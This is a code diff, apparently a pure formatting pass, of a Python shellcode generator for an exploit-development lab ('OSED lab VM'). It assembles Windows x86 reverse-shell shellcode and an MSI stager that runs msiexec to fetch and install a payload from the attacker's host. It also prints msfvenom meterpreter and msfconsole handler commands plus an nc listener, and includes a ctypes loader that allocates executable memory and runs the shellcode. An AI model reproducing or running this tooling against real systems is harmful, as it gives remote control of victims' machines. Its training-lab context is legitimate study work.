@@ -9,21 +9,21 @@ import keystone as ks
 def to_hex(s):
     retval = list()
     for char in s:
-        retval.append(hex(ord(char)).replace('0x', ''))
-    return ''.join(retval)
+        retval.append(hex(ord(char)).replace("0x", ""))
+    return "".join(retval)
 
 
 def to_sin_ip(ip_address):
     ip_addr_hex = []
     for block in ip_address.split("."):
-        ip_addr_hex.append(format(int(block), '02x'))
+        ip_addr_hex.append(format(int(block), "02x"))
     ip_addr_hex.reverse()
-    return ("0x" + "".join(ip_addr_hex))
+    return "0x" + "".join(ip_addr_hex)
 
 
 def to_sin_port(port):
-    port_hex = format(int(port), '04x')
-    return ("0x" + str(port_hex[2:4]) + str(port_hex[0:2]))
+    port_hex = format(int(port), "04x")
+    return "0x" + str(port_hex[2:4]) + str(port_hex[0:2])
 
 
 def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
@@ -264,9 +264,9 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         "       xor ecx, ecx                    ;",  # Null ECX
         "       push ecx                        ;",  # uExitCode
         "       push 0xffffffff                 ;",  # hProcess
-        "       call dword ptr [ebp+0x10]       ;"  # Call TerminateProcess
+        "       call dword ptr [ebp+0x10]       ;",  # Call TerminateProcess
     ]
-    return '\n'.join(asm)
+    return "\n".join(asm)
 
 
 def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
@@ -274,10 +274,9 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     if rev_port == "80":
         rev_port = ""
     else:
-        rev_port = (":" + rev_port)
+        rev_port = ":" + rev_port
 
-    rev_hex_payload = str(
-        to_hex(f"msiexec /i http://{rev_ip_addr}{rev_port}/X /qn"))
+    rev_hex_payload = str(to_hex(f"msiexec /i http://{rev_ip_addr}{rev_port}/X /qn"))
     rev_hex_payload_len = len(rev_hex_payload)
 
     instructions = []
@@ -285,29 +284,35 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     null_terminated = False
     for i in range(rev_hex_payload_len, 0, -1):
         # add every 4 byte (8 chars) to one push statement
-        if ((i != 0) and ((i % 8) == 0)):
-            target_bytes = rev_hex_payload[i-8:i]
+        if (i != 0) and ((i % 8) == 0):
+            target_bytes = rev_hex_payload[i - 8 : i]
             instructions.append(
-                f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};")
+                f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};"
+            )
         # handle the left ofer instructions
-        elif ((0 == i-1) and ((i % 8) != 0)):
-            if (rev_hex_payload_len % 8 == 2):
+        elif (0 == i - 1) and ((i % 8) != 0):
+            if rev_hex_payload_len % 8 == 2:
                 first_instructions.append(
-                    f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]};")
+                    f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]};"
+                )
                 first_instructions.append("push eax;")
-            elif (rev_hex_payload_len % 8 == 4):
-                target_bytes = rev_hex_payload[(
-                    rev_hex_payload_len - (rev_hex_payload_len % 8)):]
+            elif rev_hex_payload_len % 8 == 4:
+                target_bytes = rev_hex_payload[
+                    (rev_hex_payload_len - (rev_hex_payload_len % 8)) :
+                ]
                 first_instructions.append(
-                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
+                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};"
+                )
                 first_instructions.append("push eax;")
             else:
-                target_bytes = rev_hex_payload[(
-                    rev_hex_payload_len - (rev_hex_payload_len % 8)):]
+                target_bytes = rev_hex_payload[
+                    (rev_hex_payload_len - (rev_hex_payload_len % 8)) :
+                ]
                 first_instructions.append(f"mov al, 0x{target_bytes[4:6]};")
                 first_instructions.append("push eax;")
                 first_instructions.append(
-                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
+                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};"
+                )
                 first_instructions.append("push ax;")
             null_terminated = True
 
@@ -439,25 +444,25 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         "       xor ecx, ecx                    ;",  # Null ECX
         "       push ecx                        ;",  # uExitCode
         "       push 0xffffffff                 ;",  # hProcess
-        "       call dword ptr [ebp+0x10]       ;"  # Call TerminateProcess
+        "       call dword ptr [ebp+0x10]       ;",  # Call TerminateProcess
     ]
-    return '\n'.join(asm)
+    return "\n".join(asm)
 
 
 def main(args):
     help_msg = ""
-    if (args.msi):
+    if args.msi:
         shellcode = msi_shellcode(args.lhost, args.lport, args.debug_break)
-        help_msg += f'\t Create msi payload:\n'
-        help_msg += f'\t\t msfvenom -p windows/meterpreter/reverse_tcp LHOST={args.lhost} LPORT=443 -f msi -o X\n'
-        help_msg += f'\t Start http server (hosting the msi file):\n'
-        help_msg += f'\t\t sudo python -m SimpleHTTPServer {args.lport} \n'
-        help_msg += f'\t Start the metasploit listener:\n'
+        help_msg += f"\t Create msi payload:\n"
+        help_msg += f"\t\t msfvenom -p windows/meterpreter/reverse_tcp LHOST={args.lhost} LPORT=443 -f msi -o X\n"
+        help_msg += f"\t Start http server (hosting the msi file):\n"
+        help_msg += f"\t\t sudo python -m SimpleHTTPServer {args.lport} \n"
+        help_msg += f"\t Start the metasploit listener:\n"
         help_msg += f'\t\t sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {args.lhost}; set LPORT 443; exploit"'
     else:
         shellcode = rev_shellcode(args.lhost, args.lport, args.debug_break)
-        help_msg += f'\t Start listener:\n'
-        help_msg += f'\t\t nc -lnvp {args.lport}'
+        help_msg += f"\t Start listener:\n"
+        help_msg += f"\t\t nc -lnvp {args.lport}"
 
     eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
     encoding, count = eng.asm(shellcode)
@@ -479,7 +484,7 @@ def main(args):
             sentry = True
 
     if sentry:
-        print(f'[=] {final}', file=sys.stderr)
+        print(f"[=] {final}", file=sys.stderr)
         raise SystemExit("[!] Remove bad characters and try again")
 
     print(f"[+] shellcode created!")
@@ -487,9 +492,10 @@ def main(args):
     print(f"[=]   lhost: {args.lhost}")
     print(f"[=]   lport: {args.lport}")
     print(
-        f"[=]   break: {['breakpoint disabled', 'breakpoint active'][args.debug_break]}")
+        f"[=]   break: {['breakpoint disabled', 'breakpoint active'][args.debug_break]}"
+    )
     print(f"[=]   ver:   {['pure reverse sehll', 'MSI stager'][args.msi]}")
-    if (args.store_shellcode):
+    if args.store_shellcode:
         print(f"[=]   Shellcode stored in: shellcode.bin")
         f = open("shellcode.bin", "wb")
         f.write(bytearray(encoding))
@@ -497,7 +503,9 @@ def main(args):
     print(f"[=]   help:")
     print(help_msg)
     print("\t Remove bad chars with msfvenom (use --store-shellcode flag): ")
-    print("\t\t cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d\" -f python -v shellcode")
+    print(
+        '\t\t cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d" -f python -v shellcode'
+    )
     print()
     print(final)
 
@@ -508,42 +516,74 @@ def main(args):
             sh += struct.pack("B", e)
 
         packed_shellcode = bytearray(sh)
-        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(
-            len(packed_shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
-        buf = (ctypes.c_char * len(packed_shellcode)
-               ).from_buffer(packed_shellcode)
-        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(
-            ptr), buf, ctypes.c_int(len(packed_shellcode)))
+        ptr = ctypes.windll.kernel32.VirtualAlloc(
+            ctypes.c_int(0),
+            ctypes.c_int(len(packed_shellcode)),
+            ctypes.c_int(0x3000),
+            ctypes.c_int(0x40),
+        )
+        buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(packed_shellcode)
+        ctypes.windll.kernel32.RtlMoveMemory(
+            ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode))
+        )
         print("[=]   Shellcode located at address %s" % hex(ptr))
         input("...ENTER TO EXECUTE SHELLCODE...")
-        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
-                                                 ctypes.c_int(0),
-                                                 ctypes.c_int(ptr),
-                                                 ctypes.c_int(0),
-                                                 ctypes.c_int(0),
-                                                 ctypes.pointer(ctypes.c_int(0)))
-        ctypes.windll.kernel32.WaitForSingleObject(
-            ctypes.c_int(ht), ctypes.c_int(-1))
+        ht = ctypes.windll.kernel32.CreateThread(
+            ctypes.c_int(0),
+            ctypes.c_int(0),
+            ctypes.c_int(ptr),
+            ctypes.c_int(0),
+            ctypes.c_int(0),
+            ctypes.pointer(ctypes.c_int(0)),
+        )
+        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     parser = argparse.ArgumentParser(
-        description='Creates shellcodes compatible with the OSED lab VM')
+        description="Creates shellcodes compatible with the OSED lab VM"
+    )
 
     parser.add_argument(
-        '-l', '--lhost', help='listening attacker system (default: 127.0.0.1)', default='127.0.0.1')
+        "-l",
+        "--lhost",
+        help="listening attacker system (default: 127.0.0.1)",
+        default="127.0.0.1",
+    )
     parser.add_argument(
-        '-p', '--lport', help='listening port of the attacker system (default: 4444)', default='4444')
+        "-p",
+        "--lport",
+        help="listening port of the attacker system (default: 4444)",
+        default="4444",
+    )
     parser.add_argument(
-        '-b', '--bad-chars', help='space separated list of bad chars to check for in final egghunter (default: 00)', default=['00'], nargs='+')
+        "-b",
+        "--bad-chars",
+        help="space separated list of bad chars to check for in final egghunter (default: 00)",
+        default=["00"],
+        nargs="+",
+    )
     parser.add_argument(
-        '-m', '--msi', help='use an msf msi exploit stager (short)', action='store_true')
-    parser.add_argument('-d', '--debug-break',
-                        help='add a software breakpoint as the first shellcode instruction', action='store_true')
-    parser.add_argument('-t', '--test-shellcode',
-                        help='test the shellcode on the system', action='store_true')
-    parser.add_argument('-s', '--store-shellcode',
-                        help='store the shellcode in binary format in the file shellcode.bin', action='store_true')
+        "-m", "--msi", help="use an msf msi exploit stager (short)", action="store_true"
+    )
+    parser.add_argument(
+        "-d",
+        "--debug-break",
+        help="add a software breakpoint as the first shellcode instruction",
+        action="store_true",
+    )
+    parser.add_argument(
+        "-t",
+        "--test-shellcode",
+        help="test the shellcode on the system",
+        action="store_true",
+    )
+    parser.add_argument(
+        "-s",
+        "--store-shellcode",
+        help="store the shellcode in binary format in the file shellcode.bin",
+        action="store_true",
+    )
 
     args = parser.parse_args()
 
